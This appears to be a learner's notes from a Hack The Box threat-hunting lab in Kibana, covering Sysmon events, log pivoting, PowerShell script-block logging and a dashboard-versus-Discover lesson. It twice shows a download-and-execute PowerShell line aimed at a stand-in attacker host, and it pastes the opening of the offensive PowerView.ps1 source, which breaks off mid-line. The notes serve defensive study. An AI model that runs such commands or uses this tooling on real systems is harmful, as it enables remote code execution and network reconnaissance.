---
dg-publish: true
---









---



a comprehensive search can be initiated based on [Sysmon Event ID 15](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015) (FileCreateStreamHash), which represents a browser file download event. We're assuming that a potentially malicious OneNote file was downloaded from Gmail, our organization's email provider.


---



When i saw this :
![Pasted image 20261023151528.png](../../Attathemnts/Pasted%20image%2020261023151528.png)


i wasn't able to do the same config even that i had a part of the module wish covers this but you really need to keep this with u :


> [!important] Important Reference
> [Winlogbeat Exported Fields: Process (Elastic Docs)](https://www.elastic.co/docs/reference/beats/winlogbeat/exported-fields-process)




### Inspecting Field Values (The "Sneak Peek")

Before you add a field to your table or write a query, you can see what kind of data it actually holds.

- **How to Use It:** Simply click on any field name in the sidebar.
    
- **What it Shows:** A popup will appear showing the top 10 most frequent values for that specific field in your current time range, along with the percentage of occurrence. This is an incredibly fast way to spot anomalies or see if a field contains the exact data (like a specific IP address or file name) you are hunting for.






# 🔍 SIEM Logic: Linking Events to Processes & Building Aggregations

## 1. The Logical Link: Actions vs. Actors
When you hunt in a SIEM, data fields are not isolated; they tell a chronological story of cause and effect. 

If you search for `event.code:15 AND file.name:*invoice.one`, you are finding the **Action** (a file was downloaded). But as an analyst, you must immediately ask: *Who or what performed this action?*

This is where `process.executable` comes in. It identifies the **Actor**.
*   **`event.code:15`** = The system registered a "FileCreateStreamHash" event (a file dropped from the internet).
*   **`file.name`** = The victim (`invoice.one`).
*   **`process.executable`** = The suspect that created the file. 

If `process.executable` is `C:\Program Files\Google\Chrome\Application\chrome.exe`, it means the user manually downloaded it via a web browser. If `process.executable` is `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, it means a script downloaded the file invisibly in the background—a massive red flag indicating malicious automation. You *always* need the actor to understand the context of the action.

---

## 2. Replicating the Visual Hierarchy (Kibana Lens)

The image you are looking at is not the standard "Discover" tab. The menu showing "Rows" and "Top values of..." indicates you are in **Kibana Lens**[cite: 3], building a Data Table visualization. 

This setup groups data hierarchically (like nested folders) from the broadest category down to the exact timestamp.

### How to Replicate This View Exactly:
1. Navigate to **Dashboard** or **Visualize Library** in Kibana and select **Create visualization** -> **Lens**.
2. Set the visualization type (top middle dropdown) to **Data Table**.
3. Look at the configuration panel on the right side. Under the **Rows** section[cite: 3], you will drag and drop fields from the left sidebar or click the **(+) Add** button to stack them in this exact order:
    *   **Row 1:** Add `event.type` (Function: Top values). This categorizes the broad nature of the event (e.g., `creation`, `change`, `start`)[cite: 3].
    *   **Row 2:** Add `event.code` (Function: Top values). This breaks the type down into the specific Sysmon Event ID (e.g., `1`, `11`, `15`)[cite: 3].
    *   **Row 3:** Add `event.action` (Function: Top values). This provides the human-readable description of the code (e.g., `Process creation`, `File created`)[cite: 3].
    *   **Row 4:** Add `process.executable` (Function: Top values). This identifies the exact program path executing the action[cite: 3].
    *   **Row 5:** Add `@timestamp` (Function: Date Histogram or Top values). This pins the exact time the event occurred[cite: 3].

### Why build it this way?
By stacking the rows in this order[cite: 3], you force the table to aggregate the data logically. Instead of reading 10,000 raw logs, your table will group all identical events together, showing you a clean summary of what processes are causing what actions across your entire environment.

> [!tip] Quick Search Strategy
> In the Discover tab, you can search `process.executable:*` to filter your view to *only* show logs where an executing process is recorded, stripping out background noise before you even start hunting.






C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe



![Pasted image 20261023155253.png](../../Attathemnts/Pasted%20image%2020261023155253.png)


C:\Users\bob\Downloads\invoice.one:Zone.Identifier


![Pasted image 20261023155437.png](../../Attathemnts/Pasted%20image%2020261023155437.png)



HTB is not for copy paste you gotta focus and change almost every thing huh :

This is the date you should focus on 

They  said As part of our search process, since we're interested in DNS names, we'd like to display only the `dns.question.name` field in the result table. Please note the specified time `March 26th 2023 @ 22:05:00` to `March 26th 2023 @ 22:05:48` 
but if you check you are going to find that this is the real date : - 2023-03-26 20:05:43.609

-------



second try again LOL:


First thing i want to do is this when working with the Elastic search instead of working like searching for something then doing the next if you want other thing you need to remove what you did..... the best option is for each phase create the virtualization  and  save it up you can come back to it when ever you want also its more professional 


This is amazing we are getting progress 


![Pasted image 20261024162523.png](../../Attathemnts/Pasted%20image%2020261024162523.png)



We know when the file was installed , how it got installed and also its name hash the name of the machine 




# Tracking File Origins: Endpoint vs. Network Logs


> [!NOTE] Core Concept
> When investigating a downloaded or dropped file, network logs track *who initiated the connection*, not the direction the file traveled.

## Log Field Distinctions

*   **`host.ip` (Endpoint Log):** The local machine where the file was saved. Often records an array of all active interfaces at that exact moment (e.g., local LAN, APIPA, IPv6).
*   **`source.ip` (Network Log):** The IP that *started* the TCP connection. If a user clicked a download link, the victim's local IP is the source. 
*   **`destination.ip` (Network Log):** The external IP that *received* the request and actually delivered the file. **This is the malicious hosting server.**

## Investigation Pivot Strategy

1. **Endpoint Log:** Locate the File Creation event. Note the exact timestamp and the victim's primary routable `host.ip`.
2. **Network Log:** Query network traffic (firewall, proxy, or Zeek) at that exact timestamp where the `source.ip` matches the victim's IP.
3. **Identify:** The resulting `destination.ip` in that network event reveals exactly where the file came from.



192.168.28.130


2023-03-26 20:05:43.609


you should change time config for time 


![Pasted image 20261024165624.png](../../Attathemnts/Pasted%20image%2020261024165624.png)


its an amazing thing about HTB they give thing and they tweak the config so they make sure you navigate every corner of the tool 


(File create) and the "invoice.one" file name.

```
event.code:11 AND file.name:invoice.one*
```

![Pasted image 20261024172011.png](../../Attathemnts/Pasted%20image%2020261024172011.png)






----------------------




That is the best way to approach threat hunting. Let's break down exactly how fileless malware works, why it is so dangerous, and how we trace it through the logs.

---

The Strategy: "Living off the Land" & Fileless Execution

Historically, if malware wanted to run a script, it had to download a `.ps1` file to the hard drive and execute it. Security tools (like antivirus or EDRs) easily catch this by scanning the file the moment it touches the disk.

To bypass this, attackers use a technique called **Living off the Land (LotL)**. They use legitimate, pre-installed Windows tools (like `powershell.exe`) to execute malicious code directly in the computer's volatile memory (RAM). Because no file is ever written to the disk, standard antivirus scans find nothing.

---

How the Code Gets Into Memory

Attackers usually load tools like PowerView into memory using one of two methods:

1. **The IEX (Invoke-Expression) Download String:**
    
    powershell
    
    ```
    IEX (New-Object Net.WebClient).DownloadString('http://attacker.local')
    ```
    
    Use code with caution.
    
    _What happens:_ PowerShell reaches out to the internet, pulls the text of the script into a variable in RAM, and immediately executes it. The file `PowerView.ps1` never physically exists on the target machine.
2. **Base64 Encoded Strings:**  
    The attacker takes the entire PowerView script, turns it into a massive block of gibberish text (Base64), and feeds it to PowerShell via the command line (`powershell.exe -EncodedCommand [MassiveText]`). PowerShell decodes it in memory and runs it.

---

The Logs: Why Event ID 4104 is a Goldmine

Because nothing touches the disk, traditional file-creation logs are blank. However, Microsoft built a feature called **Script Block Logging (Event ID 4104)** specifically to combat this.

When PowerShell executes _any_ code—whether it came from a physical file, a web download, or an encoded command—the PowerShell engine must compile it into readable code right before executing it in memory.

At that exact millisecond, **Event ID 4104 captures the full, raw text of the code** and writes it to the Windows Event Log. Even if the attacker obfuscated (hid) the code, script block logging often captures the _de-obfuscated_ version right as it runs.

---

Tracing the Target: The PowerView Giveaways

Once loaded into memory, PowerView essentially acts as an automated network spy. You can instantly recognize it in the `script_block_text` logs because it replaces standard, clunky network commands with highly specific, weaponized functions.

If you read the raw script blocks captured by your SIEM, you will see a massive dump of function definitions. PowerView scans and targets the network by running commands like:

- **`Invoke-ShareFinder`**: Automatically sweeps the entire Active Directory network looking for open network shares (folders) that the current user can access.
- **`Get-DomainController`**: Identifies the primary servers controlling the network.
- **`Get-NetSession`**: Checks who is logged into which computer to find high-value targets (like Domain Admins).

When the lab query states the code "scans/targets," it is referring to this exact behavior: a tool loaded completely inside `powershell.exe`'s memory space, actively mapping out the network shares and domain architecture to figure out where the attacker should move next.

Now that you understand the "why," would you like to look at how to **pivot from this PowerShell log** to find the **network connections** it made while scanning, or how to identify the **parent process** that launched PowerShell in the first place?




```
IEX (New-Object Net.WebClient).DownloadString('http://attacker.local')

```


**Base64 Encoded Strings:**  
The attacker takes the entire PowerView script, turns it into a massive block of gibberish text (Base64), and feeds it to PowerShell via the command line (`powershell.exe -EncodedCommand [MassiveText]`). PowerShell decodes it in memory and runs it.


![Pasted image 20261025231555.png](../../Attathemnts/Pasted%20image%2020261025231555.png)


---

tags:

- cybersecurity
    
- soc
    
- kibana
    
- lessons-learned
    
- funny  
    aliases:
    
- The Great Kibana Misunderstanding
    
- Dashboard vs Discover
    

---

# 💀 Incident Report: I Built a Dashboard Instead of Investigating the Logs

> [!danger] Severity: Critical  
> **Time wasted:** Approximately 2–3 days  
> **Primary victim:** My sanity  
> **Attack vector:** Kibana UI confusion  
> **Root cause:** I was trying to investigate events while thinking like a dashboard builder.  
> **Status:** Humbling educational experience acquired.

## 🎬 The Incident

The mission was simple:

> Some PowerShell code has been loaded into memory that scans or targets network shares. Identify which hacking tool the code comes from.

All I needed was to investigate PowerShell logs, find the actual script, identify distinctive code, and search for its source.

Instead, my brain said:

**"Let's spend three days creating a beautiful dashboard."**

I was adding fields, fighting with empty columns, writing queries, and wondering why Kibana wasn't showing me useful information.

Meanwhile, the actual PowerShell script was sitting somewhere in the logs like:

> "Bro, I am literally the evidence. LOOK AT THE EVENT." 💀

### The plot twist

I had been treating Kibana like a dashboard-building application when my immediate task was a log-investigation task.

I confused two related but different tools:

- **Discover:** Where I investigate individual events and hunt for evidence.
    
- **Dashboard:** Where I visualize and monitor information from saved searches, charts, tables, and aggregations.
    

Both are useful. I was just using the wrong starting point for the job.

---

## 🧠 The Actual Difference

### 1. Discover = Detective mode 🕵️

**Question it answers:** What actually happened?

Discover lets me query, filter, inspect, and compare individual log events.

Examples:

- Which PowerShell events occurred?
    
- What did Event ID 4104 contain?
    
- Which process launched PowerShell?
    
- What command line was recorded?
    
- What happened immediately before or after the suspicious event?
    
- Which fields contain the evidence I need?
    

Example KQL:

```
event.code: "4104"
```

This finds events matching the event-code field and value. I then inspect individual results to see what information each document contains.

**Discover is where I start when I don't yet know what happened.**

### 2. Dashboard = Control room 📊

**Question it answers:** What patterns should I monitor?

A dashboard combines visualizations, saved searches, metrics, and other panels to summarize data.

Examples:

- How many PowerShell events occurred today?
    
- Which hosts generated the most alerts?
    
- How many failed logons happened over time?
    
- Which detection rules triggered most frequently?
    
- Is suspicious activity increasing?
    

A dashboard can be excellent for monitoring an environment, but a chart showing 500 PowerShell events won't automatically tell me which script contains the evidence.

**A dashboard helps me see patterns. Discover helps me examine the evidence behind those patterns.**

---

## ⚔️ Side-by-Side Comparison

|Task|Best starting point|
|---|---|
|Find a specific Windows event|Discover|
|Read PowerShell script-block contents|Discover|
|Search for a suspicious command line|Discover|
|Correlate events by time, host, or process|Discover, then other investigation tools as needed|
|Visualize event counts over time|Dashboard|
|Monitor alerts across multiple hosts|Dashboard|
|Build an ongoing SOC monitoring view|Dashboard|
|Identify the original source of suspicious code|Discover → extract code → search public sources|

> [!tip] Important nuance  
> Dashboards can contain tables and saved searches, and Discover can support visual analysis. The distinction is about the primary job, not a strict technical limitation.

---

## 🔬 My Correct Investigation Workflow

For the PowerShell network-share challenge, the workflow should be:

```
flowchart TD
    A["Challenge: Identify the source tool"] --> B["Discover: Find PowerShell events"]
    B --> C["Filter for Event ID 4104"]
    C --> D["Inspect the actual event document"]
    D --> E{"Is script content available?"}
    E -->|Yes| F["Reconstruct script fragments if needed"]
    E -->|No| G["Check alternate fields and other telemetry"]
    G --> H["Correlate process and PowerShell events"]
    F --> I["Extract distinctive code snippets"]
    H --> I
    I --> J["Search Google and GitHub"]
    J --> K["Compare matching source code"]
    K --> L["Identify the tool"]
    L --> M["Document evidence and conclusion"]
```

### The first practical step

In Discover, run:

```
event.code: "4104"
```

I already confirmed that this query returns events.

That means my next job is to inspect one returned event and determine whether its original document contains the script text.

If `powershell.file.script_block_text` is empty, I should check the JSON/source and alternative field names. If the script text truly isn't present, I should pivot to the other available PowerShell and process telemetry rather than repeatedly changing the same query.

**Never confuse a missing field with proof that the activity didn't happen.**

---

## 🧩 The Mental Model I Need to Remember

When my manager asks me to investigate something, I shouldn't immediately ask:

> "What dashboard should I build?"

I should ask:

1. **What do I know?** Start with the clues in the alert or challenge.
    
2. **What evidence would prove it?** Identify the event types, fields, and relationships that could answer the question.
    
3. **Where is that evidence?** Search the relevant logs in Discover.
    
4. **What does it mean?** Inspect and correlate the events.
    
5. **How can I prove my conclusion?** Compare the evidence with reliable references.
    
6. **Would a dashboard help in the future?** Build one when recurring monitoring or visualization would be useful.
    

This is the difference between merely using a SIEM and actually conducting an investigation.

---

## 😂 Lessons Paid for With Three Days of My Life

> [!quote] The lesson  
> "Before building the control room, make sure you've actually found the crime scene."

- Learned how to spend time fighting with Kibana.
    
- Learned that an empty column doesn't mean an empty investigation.
    
- Learned that dashboards and Discover serve different primary purposes.
    
- Stop building visualizations before establishing what evidence I need.
    
- Inspect the raw event before making assumptions about its fields.
    
- Build dashboards _after_ I understand the data and know what I want to monitor.
    

### Final takeaway

**Discover first. Understand the evidence. Dashboard later.**

I'm not stupid; I'm learning how to use a professional investigation platform. The mistake wasn't spending time learning dashboards. It was not distinguishing between _building a monitoring view_ and _hunting for evidence_ before starting.

And honestly?

**I went into Kibana to find a hacker's PowerShell script and accidentally gave myself a three-day dashboard-building side quest.** 💀

_Lesson learned. Back to hunting._

![Pasted image 20261026000344.png](../../Attathemnts/Pasted%20image%2020261026000344.png)



```
#requires -version 2

<#

    PowerSploit File: PowerView.ps1
    Author: Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

#>

########################################################
#
# PSReflect code for Windows API access
# Author: @mattifestation
#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
#
########################################################

function New-InMemoryModule
{
<#
    .SYNOPSIS

        Creates an in-memory assembly and module

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None

    .DESCRIPTION

        When defining custom enums, structs, and unmanaged functions, it is
        necessary to associate to an assembly module. This helper function
        creates an in-memory module that can be passed to the 'enum',
        'struct', and Add-Win32Type functions.

    .PARAMETER ModuleName

        Specifies the desired name for the in-memory assembly and module. If
        ModuleName is not provided, it will default to a GUID.

    .EXAMPLE

        $Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $LoadedAssemblies = [AppDomain]::CurrentDomain.GetAssemblies()

    ForEach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = [AppDomain]::CurrentDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
    .SYNOPSIS

        Creates a .NET type for an unmanaged Win32 function.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: func

    .DESCRIPTION

        Add-Win32Type enables you to easily interact with unmanaged (i.e.
        Win32 unmanaged) functions in PowerShell. After providing
        Add-Win32Type with a function signature, a .NET type is created
        using reflection (i.e. csc.exe is never called like with Add-Type).

        The 'func' helper function can be used to reduce typing when defining
        multiple function definitions.

    .PARAMETER DllName

        The name of the DLL.

    .PARAMETER FunctionName

        The name of the target function.

    .PARAMETER ReturnType

        The return type of the function.

    .PARAMETER ParameterTypes

        The function parameters.

    .PARAMETER NativeCallingConvention

        Specifies the native calling convention of the function. Defaults to
        stdcall.

    .PARAMETER Charset

        If you need to explicitly call an 'A' or 'W' Win32 function, you can
        specify the character set.

    .PARAMETER SetLastError

        Indicates whether the callee calls the SetLastError Win32 API
        function before returning from the attributed method.

    .PARAMETER Module

        The in-memory module that will host the functions. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER Namespace

        An optional namespace to prepend to the type. Add-Win32Type defaults
        to a namespace consisting only of the name of the DLL.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $FunctionDefinitions = @(
          (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
          (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
          (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
        )

        $Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
        $Kernel32 = $Types['kernel32']
        $Ntdll = $Types['ntdll']
        $Ntdll::RtlGetCurrentPeb()
        $ntdllbase = $Kernel32::GetModuleHandle('ntdll')
        $Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

    .NOTES

        Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

        When defining multiple function prototypes, it is ideal to provide
        Add-Win32Type with an array of function signatures. That way, they
        are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        $FunctionName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            ForEach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $Null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField, $CallingConventionField, $CharsetField),
                [Object[]] @($SLEValue, ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention), ([Runtime.InteropServices.CharSet] $Charset)))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        ForEach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
    .SYNOPSIS

        Creates an in-memory enumeration for use in your PowerShell session.

        Author: Matthew Graeber (@mattifestation)
        License: BSD 3-Clause
        Required Dependencies: None
        Optional Dependencies: None
     
    .DESCRIPTION

        The 'psenum' function facilitates the creation of enums entirely in
        memory using as close to a "C style" as PowerShell will allow.

    .PARAMETER Module

        The in-memory module that will host the enum. Use
        New-InMemoryModule to define an in-memory module.

    .PARAMETER FullName

        The fully-qualified name of the enum.

    .PARAMETER Type

        The type of each enum element.

    .PARAMETER EnumElements

        A hashtable of enum elements.

    .PARAMETER Bitfield

        Specifies that the enum should be treated as a bitfield.

    .EXAMPLE

        $Mod = New-InMemoryModule -ModuleName Win32

        $ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
            UNKNOWN =                  0
            NATIVE =                   1 # Image doesn't require a subsystem.
            WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
            WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
            OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
            POSIX_CUI =                7 # Image runs in the Posix character subsystem.
            NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
            WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
            EFI_APPLICATION =          10
            EFI_BOOT_SERVICE_DRIVER =  11
            EFI_RUNTIME_DRIVER =       12
            EFI_ROM =                  13
            XBOX =                     14
            WINDOWS_BOOT_APPLICATION = 16
        }

    .NOTES

        PowerShell purists may disagree with the naming of this function but
        again, this was developed in such a way so as to emulate a "C style"
        definition as closely as possible. Sorry, I'm not going to name it
        New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetT
        
```



